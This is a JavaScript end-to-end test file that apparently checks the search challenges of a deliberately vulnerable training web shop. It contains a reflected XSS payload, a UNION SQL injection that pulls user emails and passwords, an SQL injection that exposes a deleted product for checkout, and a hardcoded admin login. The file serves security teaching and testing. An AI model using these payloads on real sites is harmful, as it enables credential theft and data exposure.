'use strict'

var config = require('config')
var christmasProduct = config.get('products').filter(function (product) {
  return product.useForChristmasSpecialChallenge
})[0]

describe('/#/search', function () {
  var searchQuery, searchButton

  beforeEach(function () {
    browser.get('/#/search') // not really necessary as search field is part of navbar on every dialog
    searchQuery = element(by.model('searchQuery'))
    searchButton = element(by.id('searchButton'))
  })

  describe('challenge "xss1"', function () {
    it('search query should be susceptible to reflected XSS attacks', function () {
      var EC = protractor.ExpectedConditions

      searchQuery.sendKeys('<script>alert("XSS1")</script>')
      searchButton.click()
      browser.wait(EC.alertIsPresent(), 5000, "'XSS1' alert is not present")
      browser.switchTo().alert().then(function (alert) {
        expect(alert.getText()).toEqual('XSS1')
        alert.accept()
      })
    })

    protractor.expect.challengeSolved({challenge: 'XSS Tier 1'})
  })

  describe('challenge "unionSqlI"', function () {
    it('search query should be susceptible to UNION SQL injection attacks', function () {
      var EC = protractor.ExpectedConditions

      searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null,null from users--')
      searchButton.click()

      browser.wait(EC.alertIsPresent(), 5000, "'XSS2' alert is not present")
      browser.switchTo().alert().then(function (alert) {
        expect(alert.getText()).toEqual('XSS2')
        alert.accept()
      })

      var productDescriptions = element.all(by.repeater('product in products').column('description'))
      expect(productDescriptions.first().getText()).toBe('admin@' + config.get('application.domain'))
    })

    protractor.expect.challengeSolved({challenge: 'User Credentials'})
  })

  describe('challenge "christmasSpecial"', function () {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('search query should reveal logically deleted christmas special product on SQL injection attack', function () {
      searchQuery.sendKeys(christmasProduct.name + '%25\'))--')
      searchButton.click()

      var productNames = element.all(by.repeater('product in products').column('name'))
      expect(productNames.first().getText()).toBe(christmasProduct.name)

      element(by.css('.fa-cart-plus')).element(by.xpath('ancestor::a')).click()
      browser.wait(protractor.ExpectedConditions.presenceOf($('.alert-info')), 5000, 'Product addition info box not present.') // eslint-disable-line no-undef

      browser.get('/#/basket')
      browser.wait(protractor.ExpectedConditions.presenceOf($('tr[data-ng-repeat="product in products"]')), 5000, 'Basket item list not present.') // eslint-disable-line no-undef
      element(by.id('checkoutButton')).click()
    })

    protractor.expect.challengeSolved({challenge: 'Christmas Special'})
  })
})
